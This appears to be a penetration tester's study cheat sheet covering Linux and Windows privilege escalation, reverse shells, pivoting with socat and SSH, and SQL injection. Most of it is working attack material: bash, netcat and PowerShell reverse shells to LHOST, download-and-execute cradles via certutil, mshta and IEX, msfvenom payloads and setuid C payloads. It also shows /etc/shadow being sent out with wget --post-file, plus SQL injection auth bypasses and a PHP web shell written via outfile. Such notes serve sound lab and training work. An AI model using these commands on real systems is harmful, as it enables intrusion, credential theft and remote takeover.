### [https://github.com/diego-treitos/linux-smart-enumeration \(lse.sh\)](https://github.com/diego-treitos/linux-smart-enumeration)

### [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite \(linpeas.sh\)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

[https://github.com/Anon-Exploiter/SUID3NUM \(suid3num.py\)](https://github.com/Anon-Exploiter/SUID3NUM)

[https://github.com/zet-/linux-exploit-suggester \(les.sh\)](https://github.com/mzet-/linux-exploit-suggester)

[https://github.com/sleventyeleven/linuxprivchecker \(linuxprivchecker.py\)](https://github.com/sleventyeleven/linuxprivchecker)

[https://github.com/AlessandroZ/BeRoot \(beroot.py\)](https://github.com/AlessandroZ/BeRoot)

[http://pentestmonkey.net/tools/audit/unix-privesc-check \(unix-privesc-check\)](http://pentestmonkey.net/tools/audit/unix-privesc-check)

## First 6 scripts can be downloaded by using this bash script

```bash
#!/bin/bash
wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh
chmod 700 linenum.sh
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
chmod 700 lse.sh
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
chmod 700 linpeas.sh
wget "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py
chmod 700 suid3num.py
wget "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh
chmod 700 les.sh
wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
chmod 700 linuxprivchecker.py
ifconfig
echo "sudo python3 -m http.server 80"
```

# Techniques

## Kernel exploits

Enumerate the kernel version:

```text
uname -a 
cat /etc/issue
```

Then use searchsploit / linux-exploit-suggester / google to find matching exploits:

```text
searchsploit linux kernel <version> priv esc

# or you can use https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl -k <version>
```

## Service exploits

Firstly enumerate processes running as root.

```text
ps aux | grep "^root"
netstat -nl
```

Then enumerate their versions.

```text
<service> -v
<service> --version
dpkg -l | grep <service>
rpm -qa | grep <service>
```

Search for exploits for enumerated software versions.

## Stored secrets / weak file permissions

Always search through history files.

```text
history
cat ~/.bash_history
cat ~/*_history
```

Also search for files containing "password", "pass", "pwd".

```text
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

Don't overlook possible interesting files and directories with bad permissions.

```text
# Find all writable files in /etc: 
find /etc -maxdepth 1 -writable -type f

# Find all readable files in /etc: 
find /etc -maxdepth 1 -readable -type f

# Find all directories which can be written to:
find / -executable -writable -type d 2> /dev/null
```

### /etc/shadow \(default: -rw-r--r--\)

Things you can do:

1. If a file is readable, you can try to crack root hash.
2. If a file is writable, you can replace original hash.

You can generate new sha-512 \("$6$"\) hash of a password with this command.

```text
mkpasswd -m sha-512 <newpassword>
```

### /etc/passwd \(default: -rw-------\)

Things you can do when the file is writable:

1. Deleting `x` , can disable password on older systems.
2. Replacing `x` with a new password hash generated by `openssl passwd "<newpassword>"` .
3. Append new user with UID 0, but different username.

### SSH keys \(id\_rsa / authorized\_keys\)

```text
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

### Backups

Look for interesting files, also backups can be found in these locations.

```text
ls -la /
ls -la /tmp
ls -la /var/backups
```

## Sudo misconfigurations

Sudo is used to run programs as an another user, by default it's root.

```text
sudo -u <user> <program>
```

You can list programs which can be run without requiring password.

```text
sudo -l
```

Some ways to escalate privileges with unrestricted sudo:

```text
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

Shell escape sequences can be found here: [https://gtfobins.github.io/](https://gtfobins.github.io/)

### "Intended functionality"

Some program's intended functionality can also help you to escalate privileges. Always google for possible privilege escalations using programs you have access to.

#### apache2 example

When you run apache as a root, you can provide configuration file with a `-f` flag. When a file is not in correct format, apache2 will print first line of a file in error message. We can use this to read first line of a `/etc/shadow` file \(root's hash\) and crack it.

```text
sudo apache2 -f /etc/shadow
```

#### wget example

Wget command can not only download files, but also post files to webserver.

You can setup netcat listener on your machine and then by running this command on target machine, will send `/etc/shadow` your way.

```text
sudo wget --post-file=/etc/shadow <LHOST>:<LPORT>
```

### LD\_PRELOAD

When LD\_PRELOAD enviroment variable is set and you run the executable, ld will first run specified library and only after that will execute original program. 

Firstly we create source code file for a shared object.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Then compile this C code as a shared object.

```text
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```

Preload this shared object when you run executable you have permission to run with sudo.

```text
sudo LD_PRELOAD=<path_to_your_so_file> <executable_you_can_run_with_sudo>
```

### CVE-2019-14287

If your user has disabled access to some executable.

```text
user ALL=(ALL,!root) /bin/bash
```

With ALL specified, user can run the binary `/bin/bash` as any user \(not only root user, other user id's works too\).

```text
sudo -u#-1 /bin/bash
```

### CVE-2019-18634

When `pwfeedback` is set in a specific versions of sudo \(&lt;1.8.25p\), we can trigger stack-based buffer overflow. Exploiting the bug does not require sudo permissions, merely that `pwfeedback` be enabled.

```text
Matching Defaults entries for user on linux-build:
insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail

User user may run the following commands on linux-build:
(ALL : ALL) ALL
```

The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.

```text
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c -O exploit.c
gcc -o exploit exploit.c
./exploit
```

## SUID / SGID files

You can list SUID executable with this command.

```text
find / -perm -4000 -type f -exec ls --color=auto -l {} \;2>/dev/null
```

Check for easy wins: [https://gtfobins.github.io/](https://gtfobins.github.io/)

This script is great: [https://github.com/Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)

```text
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
```

```text
# Running strace against a command:
strace -v -f -e execve <command> 2>&1 | grep exec

# Running ltrace against a command:
ltrace <command>
```

### Shared object injection

Sometimes executables use third party shared objects, which we are able to hijack and run our malicious code, with permissions of original executable.

You can run `strings` on SUID executables, then look for shared object paths.

Also `strace` can show objects used by the executable.

```text
strace <executable> 2>&1
strace <executable> 2>&1 | grep -i -E "open|access|no such file"
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Compile shared object with gcc.

```text
gcc -shared -fPIC -o <output> shared_object.c
```

### Binary simlinks

[https://packetstormsecurity.com/files/139750/Nginx-Root-Privilege-Escalation.html](https://packetstormsecurity.com/files/139750/Nginx-Root-Privilege-Escalation.html)

### Enviromental variables \(PATH\)

Find anything related to enviromental variables\(PATH, etc...\)

```text
strings <executable>
```

When you find executable called without full path, create your own with same name.

```c
void main(){
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Then compile it.

```text
gcc executable.c -o executable
```

And change path to your working directory.

```text
export PATH=/tmp:$PATH
```

### Malicious bash functions

Find out if executable runs any bash commands.

```text
strings <executable>
```

When you find one, create a bash function.

```text
function /command/you/found() {cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p}
export -f /command/you/found
```

Again run original executable. But now it will run your bash function instead of original command.

## Capabilities

Kernel 2.2 and higher.

```text
getcap -r / 2>/dev/null
```

You are looking for `+ep` , like this.

```text
/usr/bin/python2.6 = cap_setuid+ep
```

And then: [https://gtfobins.github.io/\#+capabilities](https://gtfobins.github.io/#+capabilities)

```text
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Cron jobs

Crons can be enumerated with:

```text
cat /etc/crontab
```

Also located in these directories.

```text
/var/spool/cron/
/var/spool/cron/crontabs/
```

The crontab PATH environment variable is by default set to `/usr/bin:/bin`

### Cron paths

PATH + relative path = win

### Wildcards \(\*\)

When.

```text
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Then you can. 

```text
echo "cp /bin/bash /tmp/yz && chmod +s /tmp/yz" > malicious.sh
chmod +x malicious.sh
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\malicious.sh
```

## NFS root squashing

Check for `no_root_squash` .

```text
cat /etc/exports
```

Then you can list mountable folders from your attacker machine.

```text
showmount -e <RHOST>
```

And mount one of them.

```text
mkdir /tmp/<local_folder>
mount -o rw,vers=2 <RHOST>:/<remote_folder> /tmp/<local_folder>
```

Create a .c file inside your newly mounted folder.

```c
void main(){
    setgid(0);
    setuid(0);
    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
}
```

Compile it and set SUID bit on.

```text
gcc malicious.c -o malicious
chmod +s malicious
```

Finally, run it from target machine.

## Docker

If you are member of a `docker` group, you can easily escalate to root.

```text
docker run -v /:/tmp -i -t bash bash
```



# Privilege escalation

## Situational awareness

```text
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/*-release
uname -a
ps aux
ip a
ifconfig
route
routel
netstat -anp
ss -anp
cat /etc/iptables
la -lah /etc/cron*
dpkg -l

# page 528 for more
```

## Spawning root shell

### Rootbash

```text
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
/tmp/rootbash -p
```

### Executable

Create bash wrapper in c

```text
int main(){
    setuid(0);
    system("/bin/bash");
}
```

Then, compile it as a root

```text
gcc -o <out_file> <source_code>
```

### Msfvenom executable

Create msfvenom payload, then execute as a root.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
```

### Native reverse shells

```text
https://github.com/mthbernardes/rsg
```

## Enumeration tools

```text
https://github.com/diego-treitos/linux-smart-enumeration
https://github.com/rebootuser/LinEnum
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
https://github.com/sleventyeleven/linuxprivchecker
https://github.com/AlessandroZ/BeRoot
http://pentestmonkey.net/tools/audit/unix-privesc-check
```

## Techniques

### Kernel exploits

Enumerate the kernel version:

```text
uname -a 
cat /etc/issue
```

Use searchsploit to find matching exploits:

```text
searchsploit linux kernel <version> priv esc

# or you can use https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl -k <version>
```

### Service exploits

Show processes running as root:

```text
ps aux | grep "^root"
netstat -nl
```

Enumerate program versions:

```text
<service> -v
<service> --version
dpkg -l | grep <service>
rpm -qa | grep <service>
```

Search for exploits

### Weak file permissions

```text
# Find all writable files in /etc: 
find /etc -maxdepth 1 -writable -type f

# Find all readable files in /etc: 
find /etc -maxdepth 1 -readable -type f

# Find all directories which can be written to:
find / -executable -writable -type d 2> /dev/null
```

#### /etc/shadow

1. Crack root hash.
2. Replace original hash with new:

```text
mkpasswd -m sha-512 <newpassword>
```

#### /etc/passwd

1. Delete `x` , works on older systems.
2. Replace `x` with new password hash generated by `openssl passwd "<newpassword>"` .
3. Append new user with UID 0, but different username.

### Backups

Look for interesting files:

```text
ls -la /
ls -la /tmp
ls -la /var/backups
```

### Sudo

```text
# Run a program using sudo:
sudo <program>

# Run a program as a specific user: 
sudo -u <user> <program>

# List programs a user is allowed (and disallowed) to run:
sudo -l
```

Other ways to escalate privileges with sudo:

```text
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

Shell escape sequences for more programs can be found here:

```text
https://gtfobins.github.io/
```

### Cron jobs

Located in:

```text
/var/spool/cron/
/var/spool/cron/crontabs/
/etc/crantab
```

The crontab PATH environment variable is by default set to `/usr/bin:/bin`

### SUID / SGID files

```text
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;2> /dev/null
find / -user <user> -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```text
https://github.com/Anon-Exploiter/SUID3NUM
```

```text
# Running strings against a file:
strings <file>

# Running strace against a command:
strace -v -f -e execve <command> 2>&1 | grep exec

# Running ltrace against a command:
ltrace <command>
```

## Privesc strategy

Spend some time and read over the results of your enumeration.

If Linux Smart Enumeration level 0 or 1 finds something interesting, make a note of it. Create a checklist of things you need for the privilege escalation method to work.

Have a quick look around for files in your user’s home directory and other common locations \(e.g. /var/backup, /var/logs\). If your user has a history file, read it, it may have important information like commands or even passwords.

Try things that don’t have many steps first, e.g. Sudo, Cron Jobs, SUID files.

Have a good look at root processes, enumerate their versions and search for exploits.

Check for internal ports that you might be able to forward to your attacking machine.

If you still don’t have root, re-read your full enumeration dumps and highlight anything that seems odd. This might be a process or file name you aren’t familiar with, an “unusual” filesystem configured \(on Linux, anything that isn’t ext, swap, or tmpfs\), or even a username.

At this stage you can also start to think about Kernel Exploits.

# Plink.exe

[https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

```cmd
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

## Converting ssh-keygen keys

```
puttygen KEYFILE -o OUTPUT_KEY.ppk
```
<pre>
rustscan -a RHOST --ulimit 8000 -- -sV -oN nmap

for i in {1..254}; do (ping -c 1 x.x.x.${i} | grep "bytes from" &); done; sleep 2; arp -en | grep -v incomplete
for i in {1..65535}; do (echo > /dev/tcp/x.x.x.x/$i) >/dev/null 2>&1 && echo $i is open; done
</pre>
# Powershell Empire

## Docker instalation

```
# Pull the latest image
sudo docker pull bcsecurity/empire:latest

# Run the server with the rest api and socket ports open
sudo docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest

# Run the client
sudo docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest client

# To run the client against the already running server container
sudo docker container ls
sudo docker exec -it {container-id} ./ps-empire client

# with persistent storage
sudo docker pull bcsecurity/empire:latest
sudo docker create -v /empire --name data bcsecurity/empire:latest
sudo docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data bcsecurity/empire:latest

# if you prefer to be dropped into bash instead of directly into empire
sudo docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data --entrypoint /bin/bash bcsecurity/empire:latest
```
# [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

## bad characters

```
$
${
${{
${{<
${{<%
${{<%[
${{<%[%
${{<%[%'
${{<%[%'"
${{<%[%'"}
${{<%[%'"}}
${{<%[%'"}}%
```

## templating engine identification

![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png)

## have a look at documentation

Always look for the following, no matter the language or template engine:

1. How to start a print statement
2. How to end a print statement
3. How to start a block statement
4. How to end a block statement
## Bash

```bash
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

## Netcat

```bash
nc -e /bin/sh LHOST LPORT
nc -c /bin/sh LHOST LPORT
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
```

## Telnet

```bash
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet LHOST LPORT >/tmp/y
```

## Stabilizing shell

```text
SHELL=/bin/bash script -q /dev/null
[Ctrl + Z]
stty raw -echo
fg
reset
xterm
```

# Socat

[https://github.com/3ndG4me/socat/releases/tag/v1.7.3.3](https://github.com/3ndG4me/socat/releases/tag/v1.7.3.3)

[linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
[windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

## Reverse shell relay

This way we can relay reverse shells for multiple hops

```
./socat tcp-l:LPORT tcp:RHOST:RPORT &
```

## Port forwarding (fast n' ugly)

```
./socat tcp-l:LPORT,fork,reuseaddr tcp:RHOST:RPORT &
```

## Port forward (advanced)

First of all, on our own attacking machine, we issue the following command:
```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
```
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```


# SQL Injection (thanks [academy.hackthebox.eu](https://academy.hackthebox.eu/module/details/33))

## Auth Bypass
```
admin' or  1 = 1 -- -
admin' or '1'='1
admin')-- -
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

## Union Injection
```
' order by 1-- -                                      Detect number of columns using order by
' UNION select 1,2,3-- -                              Detect number of columns using Union injection
' UNION select 1,@@version,3,4-- -                    Basic Union injection
' UNION select username, 2, 3, 4 from passwords-- -   Union injection for 4 columns
```

## DB Enumeration
```
' UNION SELECT 1,@@version,3,4-- -                 Fingerprint MySQL with query output
' UNION SELECT 1,SLEEP(5),3,4-- -                  Fingerprint MySQL with no output
' UNION select 1,database(),2,3-- -                Current database name

' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -                                       List all databases
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='users'-- -    List all tables in a specific database
' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='creds'-- -      List all columns in a specific table
' UNION select 1,username,password,4 from dev.credentials-- -                                               Dump data from a table in another database
```

## Privileges
```
' UNION SELECT 1,user(),3,4-- -                                            Find current user
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -      Find if user has admin privileges
' UNION SELECT 1,grantee,privilege_type,is_grantable FROM information_schema.user_privileges WHERE user="root"-- -                   Find if all user privileges
' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -  Find which directories can be accessed through MySQL
```

## File Injection
```
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -                                    Read local file
' union select "file written successfully!" into outfile '/var/www/html/proof.txt'      Write a string to a local file
' union select "","<?php system($_REQUEST[0]); ?>","","" into outfile '/var/www/html/shell.php'-- -
```

# General SQL

## General
```
mysql -u <USER> -h <RHOST> -P <RPORT> -p
SHOW DATABASES;
USE <DATABASE>;
```

## Tables
```
CREATE TABLE logins (id INT, ...);
SHOW TABLES;
DESCRIBE logins;
INSERT INTO table_name VALUES (value_1,..);
INSERT INTO table_name(column2, ...) VALUES (column2_value, ..);
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;
```

## Columns
```
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
DROP TABLE logins;
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;
```

## Output
```
SELECT * FROM logins ORDER BY column_1;
SELECT * FROM logins ORDER BY column_1 DESC;
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE username LIKE 'admin%';
```

## MySQL Operator Precedence
Division (/), Multiplication (*), and Modulus (%)
Addition (+) and Subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
AND (&&)
OR (||)
# SSH forward connection

## Port forwarding

```
ssh -L LPORT:RHOST:RHOST USER@RHOST -fN
```

## Proxies

```
ssh -D LPORT USER@RHOST -fN
cp /etc/proxychains.conf .
vim proxychains.conf
proxychains COMMAND
```
# SSH remote connections

```
ssh-keygen
vim ~/.ssh/authorized_keys
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty PUBLICKEY
sudo systemctl status ssh
sudo systemctl start ssh
ssh -R LPORT:RHOST:RPORT USER@LHOST -i KEYFILE -fN
```

> By editing the SSH config file (usually /etc/ssh/sshd_config on Linux), you can set the GatewayPorts to yes and then it should allow SSH tunnels to listen on the other interfaces.

```
ssh -R LPORT USER@LHOST -i KEYFILE -fN
```
# Create reverse shell from code execution on Windows machine

First, you create reverse shell executable with msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o rev.exe
```

Then you'll host your executable with some http server (in this example I'll use python's http.server).

```
sudo python3 -m http.server 80
```

Now you can setup your listener (multi/handler or normal netcat listener).

And lastly from target Windows machine you'll execute certutil.

```
cmd.exe /C certutil -urlcache -split -f http://LHOST/rev.exe rev.exe
```

For more: https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

## powershell.exe

```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
# serve shell.ps1
python3 -m http.server <port>

# execute on target
powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LPORT>/shell.ps1\");"
```

### Creating encoded powershell commands on linux

```bash
echo -n "IEX (New-Object Net.WebClient).downloadstring('<thing_to_execute>')" | iconv --to-code UTF-16LE | base64 -w 0
```

## mshta.exe

Runs .hta \(HTML Application\) files

```bash
# first, we generate hta-psh file with msfvenom
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f hta-psh -o <file>.hta

# then we start server
python3 -m http.server <port>

# and run command on target host
mshta.exe http://<LHOST>:<port>/<file>.hta
```

```text
use exploit/windows/misc/hta_server

mshta.exe http://<attacker>/<path>.hta
```

## rundll32.exe

```text
# first, we generate dll file with msfvenom
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <file>.dll

# serve a file throught smb
sudo python3 ../smbserver.py -smb2support -user <user> -password <pass> <share> `pwd`

# execute on target
rundll32.exe \\<lhost>\<share>\<file>.dll,0
```

```text
use exploit/windows/smb/smb_delivery

rundll32.exe \\<attacker>\<path>\<file>.dll,0
```

## regsrv32.exe

```text
use exploit/multi/script/web_delivery

regsvr32 /s /n /u /i:http://<attacker>:<p>/<file>.sct scrobj.dll
```

## certutil.exe

```text
msfvenom -p windows/meterpreter/reverse_tcp lhost=<lhost> lport=<lport> -f exe > shell.exe

# host generated file
python3 -m http.server 80

# start listener (exploit/multi/handler)

certutil.exe -urlcache -split -f http://<target>/shell.exe shell.exe & shell.exe
```

## powershell.exe \(with powercat\)

```text
git clone https://github.com/besimorhino/powercat.git
python -m SimpleHTTPServer 80

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker>/powercat.ps1');powercat -c <attacker> -p <port> -e cmd"
```

## more ...

```text
https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
```

## [../](../)

# Spawning Administrator Shells

## msfvenom

If we can execute commands with admin privileges, a reverse shell generated by msfvenom works nicely:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe
```
This reverse shell can be caught using netcat or Metasploit’s own multi/handler.

## RDP

Alternatively, if RDP is available (or we can enable it), we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI.

```
net localgroup administrators <username> /add
```

## Admin -> SYSTEM
To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals [PsExec](https://docs.microsoft.com/enus/sysinternals/downloads/psexec).

```
.\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
```

# Manual enumeration

## System enumeration

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
wimc qfe
wimc logicaldisk get caption,description,providername
```

## User enumeration

```
whoami
whoami /priv
whoami /groups
net user
net user <netuser>
net localgroup
net localgroup <group>
```

## Network enumeration

```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

## Firewall and AV enumeration

```
sc query windefend
sc queryex type= service
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

# Privilege Escalation Tools

## winPEAS

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

Compiled releases can be found here

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases

Before running, we need to add a registry key and then reopen the command prompt:

```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Run all checks while avoiding time-consuming searches:

```
.\winPEASany.exe quiet cmd fast
```

Run specific check categories:

```
.\winPEASany.exe quiet cmd systeminfo
```


## PowerUp & SharpUp

PowerUp & SharpUp are very similar tools that hunt for specific privilege escalation misconfigurations.

PowerUp: https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1

SharpUp: https://github.com/GhostPack/SharpUp

Pre-Compiled SharpUp: https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/SharpUp.exe

PowerUp
To run PowerUp, start a PowerShell session and use dot
sourcing to load the script:

```
. .\PowerUp.ps1
```

Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.

```
Invoke-AllChecks
```

To run SharpUp, start a command prompt and run the executable:

```
.\SharpUp.exe
```

SharpUp should immediately start checking for the same misconfigurations as PowerUp.

## Seatbelt

Seatbelt is an enumeration tool. It contains a number of enumeration checks.

It does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.

Code: https://github.com/GhostPack/Seatbelt

Pre-Compiled: https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/master/Seatbelt.exe

To run all checks and filter out unimportant results:

```
.\Seatbelt.exe all
```

To run specific check(s):

```
.\Seatbelt.exe <check> <check> …
```

## accesschk.exe

AccessChk is an old but still trustworthy tool for checking user access control rights.

You can use it to check whether a user or group has access to files, directories, services, and registry keys.

The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.

# Kernel Exploits

Finding and using kernel exploits is usually a simple process:

1. Enumerate Windows version / patch level (systeminfo).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run.

Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

## Tools

Windows Exploit Suggester: https://github.com/bitsadmin/wesng

Precompiled Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

Watson: https://github.com/rasta-mouse/Watson

## Exploitation

1. Extract the output of the systeminfo command:
```
systeminfo > systeminfo.txt
```
2. Run wesng to find potential exploits:
```
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```
3. Cross-reference results with compiled exploits: https://github.com/SecWiki/windows-kernel-exploits
4. Download the compiled exploit.
5. Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with SYSTEM privileges:
```
.\x64.exe C:\PrivEsc\reverse.exe
```

# Service Exploits

## Service Commands

Query the configuration of a service:
```
sc.exe qc <name>
```
Query the current status of a service:
```
sc.exe query <name>
```
Modify a configuration option of a service:
```
sc.exe config <name> <option>= <value>
```
Start/Stop a service:
```
net start/stop <name>
```

## Insecure Service Permissions

Each service has an ACL which defines certain service-specific permissions.

Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS).

Some may be useful (e.g. SERVICE_STOP, SERVICE_START).

Some are dangerous (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.

> Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!

### Privilege Escalation
1. Run winPEAS to check for service misconfigurations:
```
.\winPEASany.exe quiet servicesinfo
```
2. Note that we can modify the “daclsvc” service.
3. We can confirm this with accesschk.exe:
```
.\accesschk.exe /accepteula -uwcqv user daclsvc
```
4. Check the current configuration of the service:
```
sc qc daclsvc
```
5. Check the current status of the service:
```
sc query daclsvc
```
6. Reconfigure the service to use our reverse shell executable:
```
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
```
7. Start a listener on Kali, and then start the service to trigger the exploit:
```
net start daclsvc
```

## Unquoted Service Path
Executables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”).

Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3…

This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.
